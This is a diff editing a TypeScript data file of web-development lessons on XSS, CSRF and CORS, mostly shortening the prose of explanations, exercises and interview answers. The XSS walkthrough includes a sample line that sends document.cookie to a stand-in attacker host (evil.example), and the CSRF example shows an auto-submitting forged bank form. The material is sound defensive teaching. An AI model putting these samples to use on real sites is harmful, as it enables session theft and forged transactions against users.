@@ -6,39 +6,35 @@ export const webFundamentalsAdvancedTopics: Topic[] = [
     title: "Web Security Basics",
     level: "advanced",
     description:
-      "Two of the most common ways attackers abuse a website's trust of its own content or its users, and why they work.",
+      "Two of the most common ways attackers abuse a site's trust in its own content or its users, and why they work.",
     explanation: `
-A lot of web security problems boil down to one core issue: a browser
-generally trusts whatever content it's given, and a server generally
-trusts requests that look like they came from a legitimate, logged-in
-user. Attackers exploit that trust in two classic ways.
+Many web security problems come down to trust. A browser generally trusts
+whatever content it's given, and a server generally trusts requests that
+look like they come from a logged-in user. Attackers exploit this in two
+classic ways.
 
-The first: imagine a site lets users post comments, and it displays
-those comments back to other visitors exactly as typed, without
-checking what's in them. If an attacker posts a comment that's actually
-a small piece of JavaScript instead of plain text, and the site
-displays it without neutralizing it, that script runs in every other
-visitor's browser as if the *site itself* had written it — able to
-steal their session, read their data, or act as them. This is called
-**cross-site scripting**, or **XSS**: sneaking attacker-controlled code
-into a page so it runs with the page's own trust and permissions.
+**Cross-site scripting (XSS).** Say a site shows user comments to other
+visitors exactly as typed. An attacker posts a comment that's really a
+bit of JavaScript. If the site displays it without neutralizing it, the
+script runs in every visitor's browser as if the *site itself* wrote it.
+It can steal their session, read their data, or act as them. XSS means
+sneaking attacker code into a page so it runs with the page's trust and
+permissions.
 
-The second: imagine you're logged into your bank in one browser tab,
-and in another tab you visit a malicious page. That malicious page
-secretly submits a request to your bank — say, a money transfer —
-using your browser. Because your browser automatically attaches your
-login cookie to *any* request it sends to the bank's domain, regardless
-of which tab triggered it, the bank's server sees what looks like a
-perfectly legitimate, authenticated request from you, and might act on
-it. This is called **cross-site request forgery**, or **CSRF**: tricking
-a victim's already-authenticated browser into sending a request the
-victim never actually intended to make.
+**Cross-site request forgery (CSRF).** Say you're logged into your bank
+in one tab and visit a malicious page in another. That page secretly
+sends your bank a request, like a money transfer, from your browser. Your
+browser attaches your login cookie to *any* request to the bank's domain,
+whichever tab sent it. So the bank sees what looks like a legitimate,
+authenticated request from you, and might act on it. CSRF means tricking
+an already-logged-in browser into sending a request the user never
+intended.
 
-The common thread in both: something ends up running or being trusted
-that the actual user never knowingly approved.
+In both, something runs or is trusted that the user never knowingly
+approved.
   `.trim(),
     analogy:
-      "XSS is like a forger slipping a fake page into a book that everyone reads as if it were the real, trusted author's words. CSRF is like someone tricking you into signing a blank check while you're not paying attention, then filling in whatever amount they want, knowing your signature (your login session) is already valid.",
+      "XSS is like a forger slipping a fake page into a book that everyone reads as the trusted author's words. CSRF is like someone getting you to sign a blank check without noticing, then filling in any amount, knowing your signature (your login session) is valid.",
     examples: [
       {
         title: "An XSS vulnerability",
@@ -48,11 +44,11 @@ that the actual user never knowingly approved.
 // If the site inserts this directly into the page HTML unescaped,
 // this script runs in every visitor's browser who views the comment.`,
         explanation:
-          "The attacker isn't hacking the server directly — they're getting the site to unknowingly serve the attacker's own script to other victims, which then runs with full access to that page, including reading cookies.",
+          "The attacker doesn't hack the server. They get the site to serve their script to other victims, where it runs with full access to the page, including its cookies.",
         walkthrough: [
-          { code: "<script>...</script>", explanation: "This isn't plain text — it's a real, executable script, submitted as if it were an ordinary comment." },
-          { code: "fetch('https://evil.example/steal?...')", explanation: "Sends the victim's own session data to a server controlled by the attacker." },
-          { code: "document.cookie", explanation: "Reads the current page's cookies — which, if this is the victim's logged-in session, could include their session identifier." },
+          { code: "<script>...</script>", explanation: "Not plain text: a real, executable script submitted as an ordinary comment." },
+          { code: "fetch('https://evil.example/steal?...')", explanation: "Sends the victim's session data to the attacker's server." },
+          { code: "document.cookie", explanation: "Reads the page's cookies, which may include the victim's session identifier if they're logged in." },
         ],
       },
       {
@@ -64,59 +60,56 @@ that the actual user never knowingly approved.
 </form>
 <script>document.getElementById("f").submit();</script>`,
         explanation:
-          "Just visiting this malicious page silently submits a form to the bank's real server. If the victim is currently logged into the bank in the same browser, their session cookie is attached automatically, and the bank may process it as a legitimate request.",
+          "Just visiting this page silently submits a form to the bank's real server. If the victim is logged into the bank in the same browser, their session cookie is attached automatically, and the bank may treat it as a legitimate request.",
       },
     ],
     howItWorks: `
-XSS works because a browser can't tell the difference between "content
-the site's own developers wrote" and "content a user submitted that
-happens to look like code," unless the site explicitly neutralizes
-special characters before displaying user-submitted content back on the
-page (a process often called **escaping** or **sanitizing**). CSRF
-works because browsers automatically attach cookies for a domain to
-*every* request sent to that domain, no matter which page or tab
-initiated the request — the browser has no built-in way to know the
-request wasn't something the user actually intended.
+**XSS** works because a browser can't tell "content the site's developers
+wrote" from "user content that happens to look like code," unless the
+site neutralizes special characters before showing user content (called
+**escaping** or **sanitizing**).
+
+**CSRF** works because browsers attach a domain's cookies to *every*
+request to that domain, whatever page or tab started it. The browser has
+no built-in way to know the user didn't intend the request.
   `.trim(),
     whyItExists: `
-Both attacks exist because trust on the web is based on patterns
-(this content is in the page, so treat it as the page's own; this
-request carries valid cookies, so treat it as the real user) that are
-easy for an attacker to exploit if a site doesn't defend against them
-directly. Understanding the plain mechanics of each attack is what
-makes the defenses against them (like escaping output, and requiring
-extra unpredictable tokens on sensitive requests) make sense, rather
-than feeling like arbitrary rules.
+Web trust runs on simple patterns: content in the page is treated as the
+page's own, and a request with valid cookies is treated as the real user.
+Attackers can exploit these easily unless a site defends against them
+directly.
+
+Knowing how each attack works makes the defenses (escaping output,
+requiring an unpredictable token on sensitive requests) make sense
+instead of feeling like arbitrary rules.
   `.trim(),
     whenToUse: `
-Think about XSS anywhere your site displays content that came from a
-user — a comment, a username, a search term — rather than content your
-own developers wrote. Think about CSRF anywhere your site performs a
-meaningful action (changing a password, transferring money, deleting
-data) in response to a request, especially one relying only on cookies
-to identify the user.
+Think about XSS anywhere your site shows content that came from a user (a
+comment, a username, a search term) rather than from your developers.
+Think about CSRF anywhere a request triggers a meaningful action
+(changing a password, moving money, deleting data), especially if only
+cookies identify the user.
   `.trim(),
     whenNotToUse: `
-These specific concerns are about a browser-based, cookie-and-content
-model. They don't map directly to systems with no browser or no shared
-session trust between requests, like a server-to-server API using
-signed tokens for every call — though those systems have their own,
-different security concerns to think through instead.
+These concerns belong to the browser model of cookies and page content.
+They don't map directly to systems without a browser or shared session
+trust, like a server-to-server API that signs every call with a token.
+Those systems have their own, different security concerns.
   `.trim(),
     commonMistakes: [
-      "Displaying user-submitted content directly in the page without escaping special characters, opening the door to XSS.",
-      "Assuming a valid session cookie alone proves a request was intentionally made by the user, which is exactly what CSRF exploits.",
-      "Treating security as something to bolt on at the end, rather than something to consider whenever user input is displayed or a sensitive action is performed.",
+      "Showing user-submitted content in the page without escaping special characters, which opens the door to XSS.",
+      "Assuming a valid session cookie proves the user meant to send the request, which is exactly what CSRF exploits.",
+      "Bolting security on at the end instead of considering it whenever user input is shown or a sensitive action runs.",
     ],
     exercises: [
-      { difficulty: "Easy", prompt: "In your own words, explain the difference between what XSS and CSRF actually get an attacker to do." },
-      { difficulty: "Medium", prompt: "Given a comment form that inserts user input directly into the page's HTML, describe exactly what a malicious comment could do to other visitors." },
-      { difficulty: "Hard", prompt: "Design a simple defense for a form-submission endpoint that would prevent the CSRF example above from succeeding, and explain why it works." },
+      { difficulty: "Easy", prompt: "In your own words, explain the difference between what XSS and CSRF let an attacker do." },
+      { difficulty: "Medium", prompt: "A comment form inserts user input directly into the page's HTML. Describe exactly what a malicious comment could do to other visitors." },
+      { difficulty: "Hard", prompt: "Design a simple defense for a form-submission endpoint that stops the CSRF example above, and explain why it works." },
     ],
     interviewQuestions: [
-      { question: "What is cross-site scripting (XSS), in plain terms?", answer: "Getting a website to display and run attacker-supplied code as if it were the site's own trusted content, typically by injecting it into content the site later renders unescaped." },
-      { question: "What is cross-site request forgery (CSRF), in plain terms?", answer: "Tricking a victim's browser into sending a request to a site the victim is already logged into, so the request looks legitimate because the browser automatically attaches the victim's session cookie." },
-      { question: "Why does a valid session cookie alone not prove a request was intentional?", answer: "Because browsers attach cookies to any request sent to a matching domain regardless of which page triggered it, so an attacker's page can cause the browser to send a fully authenticated-looking request the user never meant to make." },
+      { question: "What is cross-site scripting (XSS), in plain terms?", answer: "Getting a site to show and run attacker code as if it were the site's own trusted content, usually by injecting it into content the site later renders unescaped." },
+      { question: "What is cross-site request forgery (CSRF), in plain terms?", answer: "Tricking a victim's browser into sending a request to a site they're logged into. It looks legitimate because the browser attaches their session cookie automatically." },
+      { question: "Why does a valid session cookie alone not prove a request was intentional?", answer: "Browsers attach cookies to any request to a matching domain, whatever page triggered it. An attacker's page can make the browser send a fully authenticated-looking request the user never meant to make." },
     ],
     relatedTopics: ["cors", "browser-storage"],
     keywords: ["xss", "csrf", "security", "cross-site scripting", "cross-site request forgery"],
@@ -126,33 +119,28 @@ different security concerns to think through instead.
     title: "CORS",
     level: "advanced",
     description:
-      "Why a browser blocks a webpage from freely talking to a different website's server, and how that server can explicitly allow it.",
+      "Why a browser stops a page from freely reading another site's responses, and how that site's server can allow it.",
     explanation: `
-By default, a browser is deliberately suspicious of a webpage that
-tries to fetch data from a *different* website than the one it was
-loaded from. If a page at \`shopping.example\` tries to make a request
-to \`bank.example\`, the browser will, by default, block the page from
-reading the response — even if the request itself technically went
-through — because there's no reason to assume \`bank.example\` wants
-some random other site reading its data on a visitor's behalf.
+Browsers are deliberately wary of a page that fetches data from a
+*different* site than the one it came from. If a page at
+\`shopping.example\` requests \`bank.example\`, the browser blocks the page
+from reading the response by default, even if the request went through.
+There's no reason to assume \`bank.example\` wants another site reading
+its data on a visitor's behalf.
 
-This default blocking is called the **same-origin policy**, and it's a
-core browser security protection. But plenty of legitimate use cases
-need exactly this kind of cross-site request — a public weather API
-that many different websites are meant to call, for example. So there
-needs to be a way for a server to say "actually, it's fine, this
-specific other site is allowed to read my responses."
+This default is the **same-origin policy**, a core browser security
+protection. But many legitimate cases need cross-site requests, like a
+public weather API that lots of sites call. So a server needs a way to
+say "this other site may read my responses."
 
-That mechanism is called **CORS** — Cross-Origin Resource Sharing. A
-server that wants to allow requests from other origins includes
-specific response headers saying so, and the browser checks those
-headers before deciding whether to let the requesting page's JavaScript
-actually read the response. Without the right headers present, the
-browser blocks access to the response even though the server already
-sent it.
+That mechanism is **CORS** (Cross-Origin Resource Sharing). A server that
+allows other origins sends response headers saying so. The browser
+checks them before letting the page's JavaScript read the response.
+Without the right headers, the browser blocks access even though the
+server already sent the response.
   `.trim(),
     analogy:
-      "It's like a delivery being physically dropped off at your door, but you (the browser) refuse to let the person inside the house read what's in the package unless the sender included a note saying 'yes, this address is allowed to open it.'",
+      "It's like a package delivered to your door that you (the browser) won't let anyone inside open unless the sender included a note saying 'yes, this address may open it.'",
     examples: [
       {
         title: "A blocked cross-origin request",
@@ -163,11 +151,11 @@ fetch("https://api.otherservice.example/data")
 // Console: blocked by CORS policy — no
 // 'Access-Control-Allow-Origin' header present`,
         explanation:
-          "The request may well have reached the server and gotten a response, but the browser refuses to hand that response's data to this page's JavaScript because the server didn't explicitly allow this origin.",
+          "The request may have reached the server and gotten a response, but the browser won't give the data to this page's JavaScript because the server didn't allow this origin.",
         walkthrough: [
-          { code: "https://myapp.example", explanation: "The 'origin' this script is running from — the combination of protocol, domain, and port." },
-          { code: 'fetch("https://api.otherservice.example/data")', explanation: "A request to a different origin — different domain — which triggers a CORS check by the browser." },
-          { code: "blocked by CORS policy", explanation: "The browser withheld the response from this page's JavaScript because the server's response didn't include permission for this specific origin." },
+          { code: "https://myapp.example", explanation: "The 'origin' the script runs from: protocol, domain, and port together." },
+          { code: 'fetch("https://api.otherservice.example/data")', explanation: "A request to a different origin (a different domain), so the browser runs a CORS check." },
+          { code: "blocked by CORS policy", explanation: "The browser withheld the response because the server didn't grant permission to this origin." },
         ],
       },
       {
@@ -178,59 +166,56 @@ Content-Type: application/json
 
 {"forecast": "sunny"}`,
         explanation:
-          "By including this header naming the exact origin allowed to read the response, the server tells the browser it's fine for https://myapp.example specifically to access this data. A value of * would allow any origin at all.",
+          "This header names the exact origin allowed to read the response, telling the browser that https://myapp.example may access the data. A value of * would allow any origin.",
       },
     ],
     howItWorks: `
-When JavaScript on one origin makes a request to a different origin,
-the browser attaches the requesting page's origin to the request and
-then inspects the response headers before deciding whether to expose
-the response body to that page's JavaScript. If the server's response
-includes an \`Access-Control-Allow-Origin\` header matching the
-requesting origin (or a wildcard allowing any origin), the browser lets
-the request through; otherwise, it blocks access to the response, even
-though the network request itself may have completed successfully. For
-certain kinds of requests, the browser first sends an automatic
-"preflight" check — a separate request asking the server what's allowed
-— before sending the real one.
+When JavaScript on one origin requests another origin, the browser adds
+the page's origin to the request. It then checks the response headers
+before exposing the body to the page.
+
+If the response has an \`Access-Control-Allow-Origin\` header matching the
+requesting origin (or a wildcard for any origin), the page can read it.
+Otherwise the browser blocks access, even though the network request may
+have completed.
+
+For some kinds of requests, the browser first sends an automatic
+"preflight": a separate request asking the server what's allowed, before
+the real one.
   `.trim(),
     whyItExists: `
-CORS exists because the same-origin policy, while essential for
-security, was too restrictive for the many legitimate cases where sites
-genuinely need to share data across origins — public APIs, third-party
-widgets, services split across multiple domains. CORS gives servers an
-explicit, opt-in way to loosen that restriction only where they choose
-to, rather than the browser blocking everything cross-origin
-unconditionally or removing the protection altogether.
+The same-origin policy is essential for security but too strict for the
+many legitimate cases that share data across origins: public APIs,
+third-party widgets, services split across domains. CORS lets servers
+opt in to loosening it only where they choose, instead of browsers
+either blocking everything cross-origin or dropping the protection.
   `.trim(),
     whenToUse: `
-You'll need to configure CORS anytime a browser-based frontend on one
-origin needs to call an API hosted on a different origin — a common
-setup, and something you'll set up on the *server* side, since it's the
-server's headers that grant permission.
+You need CORS whenever a browser frontend on one origin calls an API on
+another, a common setup. You configure it on the *server*, since the
+server's headers grant permission.
   `.trim(),
     whenNotToUse: `
-CORS isn't relevant for requests made from a server to another server
-(no browser is involved, so there's no same-origin policy to enforce),
-and it isn't a substitute for actual authentication or authorization —
-allowing an origin via CORS only controls whether a browser can read
-the response; it says nothing about whether the request itself should
-be trusted or permitted for other reasons.
+CORS doesn't apply to server-to-server requests: no browser, so no
+same-origin policy. It also doesn't replace authentication or
+authorization. Allowing an origin only controls whether a browser can
+read the response, not whether the request should be trusted or
+permitted.
   `.trim(),
     commonMistakes: [
-      "Assuming a CORS error means the request never reached the server, when the server may have processed it fine — the browser is only blocking the response from being read.",
-      "Setting Access-Control-Allow-Origin to * on an API that also handles sensitive, authenticated requests, which can be an overly permissive default.",
-      "Confusing CORS with a security feature that protects the server — it's actually a browser-enforced protection for the calling page and its users.",
+      "Assuming a CORS error means the request never reached the server, when the server may have processed it fine. The browser only blocks reading the response.",
+      "Setting Access-Control-Allow-Origin to * on an API that also handles sensitive, authenticated requests, which can be too permissive.",
+      "Thinking CORS protects the server, when it's a browser-enforced protection for the calling page and its users.",
     ],
     exercises: [
-      { difficulty: "Easy", prompt: "In your own words, explain why the same-origin policy blocks a page's JavaScript from reading a cross-origin response by default." },
-      { difficulty: "Medium", prompt: "Given a fetch request that fails with a CORS error, list the response header that would need to be added on the server to fix it, naming the specific allowed origin." },
-      { difficulty: "Hard", prompt: "Explain what a CORS preflight request is, why it's necessary for some requests but not others, and sketch what a server would need to respond with to satisfy it." },
+      { difficulty: "Easy", prompt: "In your own words, explain why the same-origin policy stops a page's JavaScript from reading a cross-origin response by default." },
+      { difficulty: "Medium", prompt: "A fetch request fails with a CORS error. Name the response header the server needs to add to fix it, with the specific allowed origin." },
+      { difficulty: "Hard", prompt: "Explain what a CORS preflight request is, why some requests need it and others don't, and sketch what the server must respond with to satisfy it." },
     ],
     interviewQuestions: [
-      { question: "What problem does the same-origin policy solve?", answer: "It prevents a webpage's JavaScript from freely reading responses from a different origin's server by default, protecting users from malicious pages silently reading data from other sites they happen to be logged into." },
-      { question: "What is CORS, and who configures it?", answer: "Cross-Origin Resource Sharing — a mechanism where a server includes response headers explicitly permitting specific other origins to read its responses. It's configured on the server, not the requesting page." },
-      { question: "If a request fails due to CORS, did the server actually receive it?", answer: "Often yes — the request can reach the server and get processed normally; the browser is what blocks the calling page's JavaScript from reading the response, because the server didn't grant permission via the right header." },
+      { question: "What problem does the same-origin policy solve?", answer: "By default it stops a page's JavaScript from reading responses from another origin. That protects users from malicious pages silently reading data from other sites they're logged into." },
+      { question: "What is CORS, and who configures it?", answer: "Cross-Origin Resource Sharing: the server sends response headers that let specific other origins read its responses. It's configured on the server, not the requesting page." },
+      { question: "If a request fails due to CORS, did the server actually receive it?", answer: "Often yes. The request can reach the server and be processed normally; the browser just blocks the page's JavaScript from reading the response because the server didn't send the right permission header." },
     ],
     prerequisites: ["how-the-web-works"],
     relatedTopics: ["web-security-basics", "how-the-web-works"],
